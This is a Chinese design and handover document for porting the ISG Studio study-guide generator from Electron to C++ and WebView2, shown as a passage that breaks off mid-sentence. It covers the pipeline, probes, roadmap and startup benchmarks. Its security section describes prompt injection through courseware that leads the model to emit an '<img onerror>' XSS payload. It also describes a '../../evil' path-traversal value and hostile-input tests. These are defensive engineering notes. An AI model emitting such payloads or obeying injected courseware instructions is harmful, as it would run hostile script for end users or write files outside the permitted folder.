# ISG Studio · C++ 重写纲领（方案 B）

> **读者**：接手这次重写的下一个人（或 agent）。
> **性质**：这份文档给的是**判断、路线与思想**，不是接口明细。
> 接口以 [`architecture.md`](../../isg-studio/docs/architecture.md) 为唯一来源，模型侧契约以
> [`generation-contract.md`](../../isg-studio/docs/generation-contract.md) 为唯一来源，
> 页面侧规范以 [`SKILL.md`](../../../skills/interactive-study-guide/SKILL.md) 为唯一来源。
> **这三份没有被复制进本工程**（理由与打包时的去向见 [`README.md`](README.md)）。
> **与那三份冲突时，以那三份为准，这份文档改。**
>
> ~~**新工程建立后，把本文件复制到新工程根目录的 `docs/guidance.md`，就地维护。**~~
> ✅ **已完成（2026-10-17）**：本文件就是那份拷贝，新工程在 `apps/isg-studio-cpp/`；
> `apps/isg-studio/docs/guidance.md` 顶部已加"已移交、别在这里改"的提示，避免两边走散。

---

## 0. 如果你只有 30 分钟

1. 这个应用**不是"一个 Electron 应用"**，是**一个生成器 + 一个校验器**。UI 只是外壳。
2. 它的全部价值集中在三样东西上：`skills/interactive-study-guide/`（内核规范）、
   `docs/generation-contract.md`（模型契约）、以及"产出页面自己会自证"的探针体系。**这三样在重写中一个字都不能动。**
3. 重写要做的事，用一句话说：**把 Electron 这个宿主换成 C++ + 系统 WebView2，其余尽量翻译而不是重写。**
4. 大约 70% 的主进程代码是纯逻辑（无 Node / 无 Electron 依赖），**它们继续以 JS 形式存在**，跑在 webview 的 Worker 里；
   只把"特权能力"（文件、网络、加密、解析、窗口）落到 C++。
5. **先把 Phase 0 的验证程序写出来再谈别的**（§5）。探针能不能在 WebView2 里跑通，是整条路线的生死判据。
6. 收益的真相：**体积降 20–38 倍（这是主要红利），内存只降三成，热启动基本不变**（§3.5）。别对启动抱不切实际的期待。

---

## 1. 我对这个项目的理解

### 1.1 它是什么

输入：用户自己的课件（PPTX / PDF / 文本），可能有多份、分属四种角色（课件 / 课本 / 习题 / 历年真题）。
输出：**一个单文件 HTML**——讲解与练习紧挨着、点选项立刻判分并逐项说明错在哪、关键概念配可拖演示、
进度存在浏览器本地、右下角有陪练形象。

中间那一步（把课件变成页面）由**用户自备的大模型 API** 完成；应用自己不内置模型、不代收费。

**所以它本质是一个编译器**：

```
课件(多份) ──抽取──▶ 文本+质量信号 ──模型──▶ 大纲/讲解片段/题库JSON/演示JS ──拼装──▶ 单文件 HTML
                     ▲                                                    │
                     └────────────── 校验（探针 + 独立审题）◀───────────────┘
```

顺着这个比喻就理解了这个项目的所有设计：

| 编译器概念 | 这里对应什么 |
|---|---|
| 前端（解析源码） | `extract/`：PDF/PPTX → 分页文本 + 质量信号 |
| 中间表示（IR） | `outline.json` / `unit-prose.json` / `bank.json` / `demo.json`（契约 §1） |
| 后端（生成目标码） | `pipeline/assemble.js`：**确定性**拼装单文件 HTML |
| 类型检查 | 每段模型输出的 Schema 校验 + 回灌重出（`askJson`、`bank.js` 的 `badReason`） |
| 测试套件 | **探针**（`verify-probe.js` 等）：把产物真的跑一遍，看它自证 |
| 独立复核 | `auditBank()`：另起一次模型调用，只给题库和素材，从头独立重算答案 |

**最反直觉、也最容易被继任者低估的一点**：这个项目最难的部分不是 UI，也不是调模型，
而是**"证明产出是对的"**。判分逻辑错了、题库 JSON 写坏一段、DOM 顺序不对——
这三种情况页面**都不报错**，只是题凭空消失或判分静默失效。整个探针体系（十一项必查）就是为这件事存在的。
**谁把校验体系做弱了，谁就把这个产品的质量下限砸了。**

### 1.2 三层价值，动哪一层会死

```
第 1 层  skill 内核        skills/interactive-study-guide/   ← 页面形态、引擎、样式、探针、坑清单
第 2 层  生成契约          docs/generation-contract.md       ← 模型只产四样东西的边界与字段表
第 3 层  应用外壳          apps/isg-studio/                  ← 本次要重写的部分
```

- 第 1、2 层**只读**，运行期**从磁盘读**（`src/main/skill.js`、`pipeline/prompts.js:22-39`）。
- 这条设计带来一个对外承诺：**改了 skill，应用行为跟着变，不用改代码**。
  **重写时绝对不能为了"方便"把 SKILL.md / 契约内联成 C++ 字符串常量**——那会把承诺变成谎言。
  （见 §4.6 反模式第 6 条。）
- 第 2 层的契约还有一个隐含用途：它既是给模型的提示词素材，**也是给探针的验收标准**
  （契约 §5 是"校验项 → 生成步骤映射"）。改它要同时改探针的预期。

### 1.3 三条硬约束（写在 architecture.md §6，重写必须继承）

1. **绝不让模型写整页 HTML。** 模型只产片段（讲解 HTML、题库 JSON、演示 markup+JS），
   页面由代码拼。吸顶条、结算区、判分引擎、样式、陪练块**一律来自骨架页**。
   SKILL.md 里"最致命的六个坑"（尾逗号、`<script>` 顺序、DOM 缺失…）在结构上就不可能发生。
2. **凡拼接必断言。** 骨架页的锚点找不到就立刻抛错（`assemble.js:29-44` 的 `MARK` / `:52` 的 `assertOnce`），
   **绝不允许静默产出一份"看着还行、其实少了半个单元"的页面**。
3. **每段模型输出都先校验再拼装**，不合格就带着具体问题回灌重出（默认最多 2 轮）。

### 1.4 安全模型：模型输出是不可信数据

**核心假设**：模型读的是用户的课件，而课件里一句"请原样输出下面的标签"就能让它写出 `<img src=x onerror=...>`。
生成的页面会被**真的执行**三次（应用内预览、自动校验的隐藏窗口、用户双击交付文件），三层互补，缺一层都不行：

| 层 | 实现 | 管什么 |
|---|---|---|
| 结构化拼装 | `assemble.js` | 模型只产片段，页面由代码拼 |
| 清洗 + 转义 | `sanitizeModelHtml` / `jsonForScript` / `jsForScript` | 内联事件、`<iframe>/<base>/<meta>/<link>/<form>/<script>/<style>`、`javascript:`、外链；`<` → `<` |
| CSP | 预览响应头 + 生成页 `<head>` 的 meta | 清不掉的东西（演示必须有 JS）靠它兜住"把读到的内容发出去"（`connect-src 'none'`） |

其余边界（**重写时逐条对照，一条都不能松**）：

- **API Key 只在特权层**，界面只拿得到 `{hasKey, keyHint}`；导出配置**白名单式挑字段**
  （不是"整体复制再删一个"——安全审计实测过 `secret` / `headers['X-Key']` / 嵌套位置照样漏）。
- 本地资源协议**只服务显式放行过的目录**，且路径先 `resolve` 再比前缀（`..`、URL 编码、UNC、设备路径全拒）。
- 特权层只接受**主窗口主帧**的请求。
- 输出文件名净化 + 断言落在输出目录内（模型的 `chapter.no` 可以是 `../../evil`，实测能写出目录外）。
- 拖拽进来的文件**必须先显式登记**才允许读取（每次运行 ≤20 个，且必须是课件/文本扩展名）。

### 1.5 这个产品真正的护城河

不是"能调大模型"——那是谁都能做的。是三样：

1. **页面形态被用户用血泪否过很多轮**（单页不切标签、讲练紧邻、没形象就什么都不显示……）——写死在 SKILL.md 里；
2. **判分/进度/统计/存盘这套引擎**，加上它配套的探针能在无人值守下证明自己没坏；
3. **坑清单**（`references/pitfalls.md`，80+ 条）。这是项目最贵的资产，重写时**没有一条可以丢**。

---

## 2. 功能全貌（必须 1:1 复刻）

### 2.1 六个视图（`src/renderer/views/`）

| 视图 | 要点（复刻时逐条核对） |
|---|---|
| **工作台** `workbench.js` | 拖拽区（拖入即选中，可多份）、每份标角色（课件/课本/习题/真题）、每份可标章号；章标题/学科/章号；生成选项（单元数 5–7、作答点 40–90、演示数 0–3、陪练形象、主题、内容语言、审校人数 0–3）；"接得上"的检测与一键带上；开始生成 |
| **抽取预览** `extract.js` | 分页文本；**可疑页标红且可直接编辑**（PDF 抽崩时用户能当场补救），改后的文本带着生成 |
| **运行** `run.js` | 8 阶段进度条、实时日志、模型流式输出、随时取消；"两章内容重合"时**中途提问**（10 分钟不回答按简单缝合继续） |
| **结果** `result.js` | 内嵌预览、十一项校验报告、逐条列出产出文件、导出/打开/定位、token 用量与预估费用 |
| **设置** `settings.js` | 左提供商列表（带开关）+ 右详情（Key/Base URL/格式/测试连接/模型列表）；模型映射表；分阶段选模型；自定义 UA 与请求覆写；**计费单价**；外观（主题 + 背景图 + 明暗/虚化滑块）；导入导出 |
| **关于** `about.js` | skill 来源、许可、第三方素材 |

### 2.2 生成流水线（用户可见 8 阶段，内部 9 个事件 key）

```
extract  →  analyze*  →  plan  →  prose + bank  →  demo  →  assemble  →  verify  →  repair
抽取      逐来源分析     规划     逐单元讲解+题库    演示      确定性拼装    探针       回灌修复
(不调模型) (每份来源1次) (1次)    (N次,并行限3)     (1次)    (不调模型)   (不调模型)  (0–2次)
```

\* 单来源时跳过。

几个必须照搬的行为：

- **content 阶段按单元并行、限 3 并发**（`mapLimit`，`pipeline/index.js:152`）；
- **`askJson`**（`:352`）= 调模型 → 校验 → **把问题原文回灌**重出，是所有"要 JSON"的通用包装；
- **审题 `auditBank()`**（`:1692`）：只给题库 + 素材、不给任何出题痕迹，让它从头独立重算；
  N 位审题人时**两个独立的人报同一题才改**（审题最大的风险是误报——误报会让出题人把对的改成错的）；
  只让 `severity:'high'` 触发重出；最多 2 轮；**审题本身失败不拖垮整单**；
- **修只修能定位到演示的问题**（演示 JS 报错、SVG 越界、滑块读数对不上）。讲解内容层面的质量问题**不自动重写**；
- 产物写到 `<用户选择的输出目录>/<章文件名>.html`，旁挂 `<名字>.html.isg.json`（结构化数据，用于下次"带上以前那些章"）。

### 2.3 校验体系（十一项必查 —— 完整清单见 `references/build-and-verify.md` §3）

探针把结果按 `；` 分隔 + `【组名】` 前缀写进 `document.title`，应用轮询标题读回来解析。
**十一项**：① 题库条目数 ② 缺卡=0 ③ 自动作答后判错=0/抛错=0 ④ 数值写法容错（带单位、科学计数法）
⑤ 进度/计数（**含 `load` 之后再读一次 `#s-total`**，防"题库渲染两遍"）⑥ 重做复位 ⑦ 脚本错误=无
⑧ 演示读数与 SVG 越界 ⑨ 陪练三种形态 ⑩ 台词覆盖 ⑪ 截图（**探针查不出叠字与裁切，这条只能靠人眼**）

此外还有一条探针查不出的：**演示的读数要拿公式手算核对**。应用把它做成 `demo-checks`——
让模型在生成演示时**自己给出按公式手算的期望值**（契约 §1.5），应用在隐藏窗口里把 `set` 打进去、把 `expect` 读回来比对
（数字按 **0.5% 相对容差**，因为模型手算的位数与页面 `toFixed` 的口径常不一致）。
它证明不了"公式选对了"，但能挡住**图与数不自洽**——这是探针查不出、只有人眼盯公式才能发现的一类问题。

### 2.4 生成页面自身的形态（内核，不由应用实现，但应用必须理解）

- 单页长文档，**不切标签**（切页会重置滚动位置）；讲完一节紧跟它的 2–4 道题。
- 四种题型：单选 `single` / 多选 `multi` / 填数值 `num` / 综合大题 `big`+`parts`。**不许自创题型名。**
- 关卡号 `lv` 跨章连续（`0..N-1` 无跳号），**三处同源**：正文 `data-lv`、题库每道题的 `lv`、引擎的分桶。
- **作答点 id 就是做题进度的存盘键**。老章的关卡号与题号**一个字都不许重算**——改名等于把那一章的进度清零。
- 陪练：**没形象就什么都不显示**（占位 0px），形象只有"用户同目录的图 / 内置大肥鱼"两条路。
- 交付页零外部资源（无 CDN、无网络字体、无 MathJax）。

### 2.5 多来源、多章、带上以前那些章

- 一份材料 → 一次独立的 sourceNote 分析（互不可见，避免互相污染视角）；
  **真题只提炼题型规律，原文根本不进提示词**；课本只看用户指定的那一章。
- 多章两种出法：**合成一册** / **每章一份**；每章都要单独跑一遍完整流水线（串行）。
- **"接得上"**：已有第 1–12 章、这次是 13/14，一键把以前的章都带上，从头缝到尾；
  接不上就不硬拼。带过来的章标 `frozen`。
- **进度存在浏览器本地**：应用内预览 / 双击文件 / 本地服务器三种打开方式**互相看不到对方的进度**——
  这不是 bug，要在 UI 里讲清楚（契约 §7.5）。

### 2.6 我们明确不做的事（重写时别"顺手加上"）

不内置模型、不代收费；不做 OCR（扫描件让用户自己转）；不做 Linux；
不支持"一个课件拆成多章"；不抽图表/SmartArt 里的文字；不自动重写讲解内容层面的质量问题。

---

## 3. 技术路线（方案 B）

### 3.1 形态一句话

**C++ 宿主（特权能力）+ 系统 WebView2（界面与逻辑）+ 内核目录原样读取。**

```
┌──────────────────────────────────────────────────────────────┐
│  isg-studio.exe  (C++ / ~2.5 MB)                             │
│   窗口 · 单实例 · 文件对话框 · DPAPI · WinHTTP+SSE · PDFium   │
│   探针驱动 · 本地协议白名单 · 任务生命周期                    │
└───────────────┬──────────────────────────┬───────────────────┘
                │ postMessage / host object│ 离屏可见窗口（校验时按需创建）
                ▼                          ▼
┌───────────────────────────────┐  ┌──────────────────────────┐
│ WebView2（系统运行时，共享）  │  │ WebView2（探针）         │
│  ├ 主线程：现有 renderer 原样 │  │  加载探针副本 → 读 title │
│  └ Worker：纯逻辑 JS（原样）  │  └──────────────────────────┘
└───────────────────────────────┘
        + skills/interactive-study-guide/（运行期原样读）
        + pdfium.dll (7.2 MB)
```

### 3.2 关键决策一：业务逻辑放哪

主进程约 **16.0k 行**里，**约 70% 是纯逻辑**（零 Node / 零 Electron 依赖）：
`assemble.js` `revive.js` `bank.js` `chapters.js` `sources.js` `prompts.js` `llm/openai.js` `llm/anthropic.js`
`providers.js` `extract/text.js` `verify/inject.js` `verify/guard.js`，以及**全部 renderer**。
其中 `revive.js:30` 的文件头自己就写着"纯函数：不碰网络、不碰 Electron、不碰文件系统"。

**决策：这部分继续以 JS 形式存在，跑在 UI webview 的一个 Worker 里；不翻成 C++。**

理由：
- 这 70% 里藏着最贵的资产——比如 `llm/index.js:579-662` 的 SSE 分帧状态机，注释区记录了**三个真实回归 bug**
  （`data: 0` 保活行吞掉整条流、标量误清 pending、1MB 雪球）。逐行翻译成 C++ 是最容易翻车、收益最低的活。
- 逻辑层不需要 DOM、不需要 Node——**只需要字符串处理和一次 HTTP 往返**，Worker 完全够用。
- 稳态只多一个 Worker，不多一个 webview 进程（内存/启动最优）。

**代价（唯一的结构性成本）**：Worker 里拿不到 `chrome.webview`（host object 只在主线程）。
所以 Worker ↔ C++ 要走 **Worker → 主线程 → `window.isg` → C++** 一跳转发。**这一跳要一次做对，别散在各处**（§4.3）。

**同步 fs 的死结与解法（重要）**：
那些 JS 模块用的是 `fs.readFileSync`（`readFileSync` 15 处、`existsSync` 14 处），
而 WebView2 的 host object **在 Worker 里不可用，且跨线程不可能同步**。
解法是**预热**：应用启动 / 每次生成开始时，主线程一次性把 skill 需要的东西读成一个大 JSON
（`SKILL.md` + `references/*.md` + `page-skeleton.html` + `generation-contract.md`，合计约 1 MB，全部只读）
`postMessage` 给 Worker；Worker 里的 `fs` 垫片**全部从内存取**。
写文件（产出 HTML）走 C++ 异步，本来就不需要同步。

### 3.3 关键决策二：哪些能力必须在 C++

| 必须 C++ | 为什么 |
|---|---|
| 网络（LLM 调用 + SSE） | **API Key 必须在特权层**；且浏览器 Origin 发 LLM 请求会被 CORS 挡 |
| 文件系统 / 对话框 / 拖拽路径 | 系统能力 |
| DPAPI 加解密 | 系统能力（等价于 `safeStorage`） |
| PDF（PDFium）/ PPTX（miniz+pugixml） | 性能 + 去掉 pdfjs 的 35 MB |
| 本地资源协议 + 白名单 | 安全模型 |
| 探针窗口 | 需要另起一个浏览器上下文 |
| 单实例、打开外部程序、导入背景图 | 系统能力 |

### 3.4 组件选型

| 用途 | 选型 | 体积 | 备注 |
|---|---|---|---|
| 窗口 / UI / 预览 / 探针 | **WebView2 SDK**（静态 loader） | 0 | 复用系统运行时；**本机已装 155.0.4283.45** |
| PDF 抽文本 | **PDFium**（`bblanchon/pdfium-binaries` 预编译） | 7.2 MB | 含 ICU 与 CJK cmap 处理，**不用再单独分发 cmaps 目录** |
| PPTX 解包 / XML | miniz + pugixml | ~200 KB | 替换 fflate |
| HTTP + SSE | **WinHTTP**（系统自带） | 0 | 流式读取 + 取消；也支持企业代理/证书 |
| JSON | nlohmann/json（header-only）或 RapidJSON | 0 | 读写都要 |
| 加密 | Windows DPAPI `CryptProtectData` | 0 | **复刻 `'enc:' + base64` 格式，老配置可直接读** |
| 哈希 | Windows CNG（BCrypt） | 0 | 进度搬家脚本的指纹 |
| 构建 | MSVC + CMake + vcpkg | — | 本机：VS2026(MSVC 14.51) + Windows SDK 10.0.26100 已就绪 |
| 安装包 | NSIS（沿用现有 `electron-builder` 的 nsis 配置思路） | — | |

**跨平台**：WebView2 只有 Windows。macOS 要 WKWebView（ObjC++）。
如果想一套代码管两平台，可以用 [saucer](https://github.com/saucer/saucer)（MIT，C++，封装 WebView2/WKWebView/WebKitGTK，
支持自定义协议与前端资源内嵌）；不想引第三方就直接用 WebView2 SDK。
**建议先用 WebView2 SDK 把 Windows 跑通**——macOS 反正在 Windows 上也没法构建。

### 3.5 交付形态与硬指标

| 指标 | 现在（实测） | 目标 | 说明 |
|---|---|---|---|
| 交付目录 | 426 MB | **≤ 15 MB**（期望 11） | exe 2.5 + pdfium 7.2 + 资产 1.9 |
| 安装包 | 127 MB | **≤ 10 MB** | pdfium 压缩后约 3.7 MB（实测） |
| 空载工作集 | 330 MB / 4 进程 | **≤ 250 MB** | 真数取决于页面复杂度，别期待数量级下降 |
| 内存（另一参照） | — | — | 机器上别的 WebView2 宿主实测 213 MB |
| 冷启动到窗口 | 估计 3–6 s | **≤ 1.5 s** | 主要来自 426 MB→11 MB 的读盘/杀软扫描差异 |
| 热启动到窗口 | 550–640 ms | **≤ 800 ms** | **基本持平，别指望变快** |
| 老用户配置 | — | **可直接读** | settings.json / history.json 格式不变 |

**Phase 0 实测（2026-10-17，取代上面几行的估计值）**

| 指标 | 纲领原估计 | **实测** |
|---|---|---|
| 宿主 exe | 2.5 MB | **≈ 181 KB**（185,344 字节；静态 loader，内核复用系统运行时——估计值高了一个数量级。<br>这个数会随 spike 长大而变，以 `docs/phase0-report.md` 当次记录为准） |
| 交付目录（**预估**） | 11–15 MB | **≈ 9.3 MB**（exe 0.18 + pdfium 7.2 + 资产 1.9）——pdfium 与资产**还没进本工程**，是推算 |
| 窗口可见 | — | **59 ms（冷）/ 58 ms（热）**（量在 Chromium 启动之前，别拿它论证读盘红利） |
| 控制器就绪（"界面能画了"） | — | **365 ms（冷）/ 362 ms（热）** ← 与 Electron 的"到窗口"最可比的量 |
| 页面就绪（导航完成） | — | **2562 ms（冷）/ 2540 ms（热）** |
| 进程收尾尾巴 | — | **49–57 ms** |
| 浏览器进程残留 | — | 6.5 – 6.7 s（见 Phase 0 遗留第 6 条） |

（数字出处：[`spike/_fixtures/bench-summary.json`](../spike/_fixtures/bench-summary.json)。）

**冷热差异的真相**：这个量级上冷启动与热启动**几乎没差别**（窗口 57 vs 59 ms、
控制器 369 vs 389 ms）。纲领原先的判断（"冷启动主要吃亏在 426 MB 的读盘/杀软扫描"）
在**宿主这一侧**已经兑现——因为宿主只剩 ~181 KB，没什么可读。剩下的大头是
Chromium 内核自己的启动（页面就绪 ~2.5 s），那部分与交付体积无关，**别指望它随体积下降**。
换句话说：**读盘那部分红利在冷启动的"窗口可见"一段上已经拿到手了，而且是极限值**。

**收益的真相**：**体积是数量级收益（20–38×），内存只有三成，热启动基本不变。**
启动慢的根源是"Chromium 内核冷启"，方案 B 只是不再自带内核，并没有去掉内核。
想真正解决启动，只有"UI 也用原生画 + webview 按需创建"——那是另一个量级的工程，本项目不做。

### 3.6 目录结构（建议）

```
isg-studio-cpp/
├── CMakeLists.txt / vcpkg.json
├── src/
│   ├── main.cpp                  # WinMain、单实例、生命周期
│   ├── app/                      # 配置目录、版本、.env 叠加、路径
│   ├── shell/                    # 窗口、webview 宿主、探针宿主、本地协议
│   ├── bridge/                   # window.isg 的 C++ 实现 + 消息路由（唯一入口）
│   ├── settings/                 # settings.json + DPAPI + 导入导出（白名单）
│   ├── net/                      # WinHTTP + SSE 分帧 + 重试/降级 + 取消令牌
│   ├── extract/                  # pdfium / pptx / text + 质量信号
│   ├── pipeline/                 # 阶段编排 + 任务生命周期 + 事件广播
│   ├── verify/                   # 注入 + 驱动 + title 解析 + demo-checks
│   └── util/                     # json / 字符串 / 路径 / utf8 / 日志 / hash
├── web/
│   ├── index.html app.css app.js views/     ← 从 src/renderer 原样搬
│   └── logic/                                ← 从 src/main 搬来的纯逻辑 JS（逐字节复制）
│       ├── assemble.js revive.js bank.js chapters.js sources.js prompts.js
│       ├── llm-openai.js llm-anthropic.js providers.js inject.js guard.js
│       └── shims/            # require('fs'|'path') → 内存预热 / C++ 桥
├── skill/                        # 运行期原样读（构建时拷入）
├── docs/                         # guidance.md · phase0-report.md（规格书**不复制**，见 docs/README.md）
└── tools/                        # 对拍脚本（构建期用 Node，不进交付物）
```

---

## 4. 实现思想（怎么生成、怎么落地）

### 4.1 总原则：这是**翻译**，不是重写

**默认动作是"照搬"，"重写"必须是例外并说明理由。** 具体：

- 纯逻辑 JS → **逐字节复制**，不改一行（连注释一起搬，注释里有踩过的坑）；
- 提示词文案 → **逐字复制**（`pipeline/prompts.js` 719 行 + skill 文档 + 契约）；
- HTML 拼装、转义、清洗、正则 → **逐字复制**；
- 只有 I/O、窗口、网络传输、解析、加密这些**宿主能力**才重新实现。

### 4.2 JS 版是 oracle（这一条是整个迁移的安全带）

**保留现有的 JS 版可运行**（就是现在这个 `apps/isg-studio/`），它不删除、不冻结，继续当参照实现。

对拍怎么做：

1. 给 JS 版加一个**命令行夹具**：读入一份 fixture（`outline.json` + `prose` + `bank.json` + `demo.json`），
   把 `assemble()` 的输出写到 stdout。**不碰网络、不碰大模型。**
2. C++ 版做同样的事。
3. **逐字节 diff。**

`assemble.js` 是**确定性**的（页面由代码拼，模型不参与），所以这条对拍能跑到"完全相同"。
差异只允许出现在显式列举的地方（如时间戳、随机 id），**每出现一处都要在文档里记账**。

这套对拍的覆盖面比想象中大得多：`revive.js`（反向解析）、`bank.js`（题库校验）、
`inject.js`（探针注入）、`guard.js` 都可以同样对拍。**这是本迁移最高性价比的投入，要在 Phase 1 就搭起来。**

### 4.3 先立骨架，再填肉

**第一件事是把契约面冻结**，而不是先写功能：

1. **`window.isg` 的 31 个 invoke 通道 + 1 个 `job:event` 订阅**（`preload.js:20-52` 的 `CHANNELS`
   数组实测 **31 条**；原先这里写"32 个通道"是把 `job:event` 也算进去了，而它是**订阅**不是 invoke——
   照字面登记会多出一个不存在的通道）先在 C++ 侧全部登记出来，
   未实现的返回一个明确的 `未实现` 错误——**不许静默返回 `undefined`**（那会让渲染层静默走错分支，
   和这个项目最痛恨的"静默失效"是同一类问题）。
2. **事件广播**（`job:event`）与**请求/响应编号表**一次设计好：Worker → 主线程 → C++ 的这一跳
   **只允许有一个实现**，不许各视图自己拼接。
3. 渲染层 `src/renderer/**` 原样搬入，**目标是一行不改**。实际会有 2–3 处必须动
   （本地协议的 URL 形式、拖拽路径获取），**每一处都要在文档里写明为什么**。

### 4.4 先啃硬骨头

不要按"从简单到复杂"排期。按**风险**排：**先做那三个做不成就要改路线的**。

1. **探针**（Phase 0）：做不成就没有自动校验，整个产品的质量下限塌掉；
2. **SSE 分帧**（Phase 3）：边界最多、有真实回归案例，但好在可以照抄；
3. **PDF 版面还原**（Phase 2）：**唯一一处不能照抄、必须重新推导的算法**（§7.2）。

### 4.5 测试跟着搬，不重建

现有 **16 套自测**是这个项目的事实规格书。重写时**逐套映射**（§5 每阶段的验收就是映射表），
尤其这三套，它们各自对应一个真被审计出来的静默失效：

- `test/hostile-input.js`（敌意输入）：题干里塞 `<!--`、`</script>`、未闭合注释、
  抄骨架配置原文、正文里写 `<img onerror>`——**每一条都对应一个"页面看着正常、内容却少了"的真实事故**；
- `test/key-leak.js`（Key 不外漏）：往配置里塞各种形态的 Key 材料，验证三条路上都拿不到明文；
- `test/e2e-mock.js`（端到端）：**真 PDF → 真抽取 → 真拼装 → 隐藏窗口跑真探针**，只把大模型换成本地假服务
  （`test/mock-provider.js`，说 OpenAI 协议、SSE **故意切包**发送）。不需要 API Key。
  **这是整个项目最有价值的一个测试，C++ 版必须有一个等价物，而且要在 Phase 5 通过。**

### 4.6 反模式（明令禁止）

1. **不许"顺手优化"提示词。** `prompts.js` 的文案与 skill 文档是一套被实测过的东西，
   改一个字就可能让生成质量不可比。要改单独提、单独验证。
2. **不许改产出页面的 DOM 结构 / 类名 / id。** 引擎、三个探针、契约全依赖它们。
3. **不许在 C++ 里"重新设计"SSE 状态机。** 照抄，包括那三个 bug 的对策。
4. **不许跳过探针去"目测页面正常"。** SKILL.md 原话：页面"看起来对"不算数。
5. **不许让模型写整页 HTML。** 这是产品的根。
6. **不许把 skill 文档 / 契约内联成 C++ 字符串常量。** 必须运行期从磁盘读。
7. **不许把 API Key 放进 webview**（哪怕"只是临时传一下"）。
8. **不许在过渡期同时改 JS 版和 C++ 版。** 单一真源：**先改 JS 版、跑通对拍、再拷过去**（§7.4）。

---

## 5. 分阶段路线图

每一阶段的**退出条件（DoD）**不过，不进下一阶段。

### Phase 0 — 技术验证 ✅ **已通过（2026-10-17，实测）**

产出：`spike/` 下的最小 C++ 工程（`isg-spike.exe`，~181 KB），一条命令跑齐全部判据：
`powershell -File tools\phase0-verify.ps1`；启动基准 `tools\bench-startup.ps1`。

**结论：go。**判据 2 与 3 都过了，不需要退到"调系统 Edge headless"的备选路线。

| # | 验什么 | 判据 | 实测 |
|---|---|---|---|
| 1 | WebView2 能用 | 能创建、能加载本地页 | ✅ 运行时 155.0.4283.45，控制器就绪 **369–395 ms** |
| 2 | **探针能跑** | 离屏窗口里读回 `document.title` 的 `【探针】` 段 | ✅ 真页（20 个作答点、**4 段 `<script data-bank>`**）**缺卡=0、自动作答后判错=0、抛错=0、脚本错误=无**；异步段（陪练）也落地，认出「内置大肥鱼」<br>（原始件：`spike/_fixtures/report-last.json`，由 `tools/phase0-verify.ps1` 每次运行覆盖） |
| 3 | **布局没被停** | `getBoundingClientRect` / `elementFromPoint` 给真值 | ✅ `innerWidth=1280`、题卡 20、`elementFromPoint` 命中 `SPAN#s-total`、`visibilityState=visible` |
| 4 | 协议与 CSP | 本地资源白名单 + CSP 响应头 | ✅ 见下方「坑 1」——**原方案是静默失效的，已改并做了 A/B 证明** |
| 5 | **真实体积** | exe 实测大小 | ✅ **≈181 KB**（185,344 字节；静态 loader，不带内核）。加 pdfium 7.2 MB + 资产 1.9 MB ≈ **9.3 MB**（后两项是预估，尚未进本工程） |
| 6 | **真实启动** | 冷/热启动到窗口的毫秒数 | ✅ 见下表 |

**启动与收尾（毫秒，相对进程创建；冷 = 删掉 user data folder，冷热交错跑，n=3+3）**

> **原始件：[`spike/_fixtures/bench-summary.json`](../spike/_fixtures/bench-summary.json)**
> （`tools/bench-startup.ps1` 每次运行都会覆盖它，`.gitignore` 里专门放行。）
> 这张表里的每个数都能追到那份文件 —— 上一版纲领吃过亏：写进来的数没有留痕，
> 与仓库里的报告对不上，谁也说不清谁对。

| 量 | 冷（最小/中位/最大） | 热（最小/中位/最大） |
|---|---|---|
| 窗口可见 | 57 / 59 / 67 | 55 / 58 / 67 |
| **控制器就绪**（"界面能画了"） | 364 / **365** / 417 | 355 / **362** / 402 |
| 页面就绪（导航完成） | 2557 / 2562 / 2609 | 2520 / 2540 / 2594 |
| 宿主收尾（teardown，含全部 webview 工作） | 2739 / 2900 / 2921（n=6） | ← 同左 |
| **进程尾巴**（活儿干完 → 进程真的退出） | 49 / 53 / 57（n=6） | ← 同左 |
| 浏览器进程残留（msedgewebview2 多久消失） | 6542 / 6593 / 6658（n=6） | ← 同左 |

**别把"冷 ≈ 热"当发现**：这个设计下它是**构造上就会成立**的——冷热两个臂都新起一整套
浏览器进程树，唯一的差别只是一个几 MB 的 user data 目录在不在盘上（而且刚被上一轮读过，
OS 缓存是热的）。另外"窗口可见"那一段量在 `StartEnvironment()` **之前**，
那时 Chromium 一个字节都还没读，所以它**不能**用来论证"426 MB → 11 MB 的读盘红利"。

**已知风险与对策（验证结果）**：`-32000,-32000` 的**可见**离屏窗口 + 两个 Chromium 开关
（`--disable-features=CalculateNativeWinOcclusion`、`--disable-background-timer-throttling`）
**确实够用**——判据 3 拿到的全是真几何信息。不需要改成 `show:false` 之类的折中。

#### Phase 0 踩到的坑（**都在下面标了"下次别重踩"的做法**）

1. **【最严重】虚拟主机映射服务出来的文档请求，不会触发 `WebResourceRequested`。**
   原方案是 `SetVirtualHostNameToFolderMapping` + 拦 DOCUMENT 补 CSP 响应头。
   实测诊断：过滤器注册返回 `0x0`、`wrcAll=1`，唯一命中的是页内 iframe 的外链
   （`https://example.com/#ctx=1`）——**我们自己那一页的文档请求一次都没进来**。
   后果是 **CSP 从来没挂上去**，而页面照样渲染、探针照样跑绿：一次彻头彻尾的静默失效。
   **做法**：不用虚拟主机映射；**文档与同目录资源全部由自己按显式白名单服务**
   （过滤器收 `ALL`，路径先百分号解码 → `GetFullPathNameW` 归一化 → 再比目录前缀；
   拒 UNC / 设备路径 / 根相对 / 任何含冒号的路径——冒号能写驱动器绝对路径与 NTFS 数据流）。
   这同时更贴合 Electron 版 `preview.js` 的形态：**白名单在我们代码里，而不是交给 WebView2**。
   **判据本身也要跟着改**：`4_…` 不能只看"过滤器注册成功"，必须看
   `docResponseServed > 0`（文档真的是我们自己送出去的）。
2. **CSP 必须做 A/B 才叫验过。**同一页只差一个 `--no-csp`：带 CSP 时
   fetch / sendBeacon / WebSocket / 外链图 / 外链 iframe **5 条全被拦**（`connect-src|frame-src|img-src`），
   不带时 **0 条**。夹具刻意选**不带 meta CSP** 的页面，否则分不清是哪一条 CSP 在起作用。
3. **同一 user data folder 的"接力"会造成启动假象。**上一轮的浏览器进程还没退场，
   下一轮 `CreateCoreWebView2Controller` 会干等它（实测：**热启动 6.5 s vs 冷启动 0.5 s**，
   完全反直觉）。**测量脚本必须在每轮之前，按自己的 `--user-data-dir` 精确清掉残留进程**。
4. **清理进程时只清自己的。**这台机器上 `SearchHost.exe`（Windows 搜索）挂着 6 个
   `msedgewebview2.exe`——`Get-Process msedgewebview2 | Stop-Process` 会去动与本工程无关的系统组件。
   必须按命令行里的 `--user-data-dir` 过滤。
5. **`--virtual-time-budget` 在 WebView2 里没有等价物**，探针的异步段只能按真实时间等。
   两个实测（都从**导航完成**算起，别混基准）：同目录**没图**时要轮询满 40×250 ms，
